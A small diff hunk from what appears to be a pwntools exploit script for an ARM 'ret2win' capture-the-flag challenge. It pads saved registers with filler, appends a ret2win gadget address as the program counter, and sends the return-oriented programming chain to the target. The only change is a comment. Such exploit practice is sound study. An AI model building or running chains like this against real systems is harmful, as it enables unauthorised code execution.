@@ -33,7 +33,7 @@ rop += b'CCCC' # r7
 rop += b'CCCC' # r8
 rop += b'CCCC' # ip
 rop += b'CCCC' # lr
-rop += bl_ret2win
+rop += bl_ret2win # pc
 
 p.sendline(rop)
 log.success(f"ROPchain = {rop}")
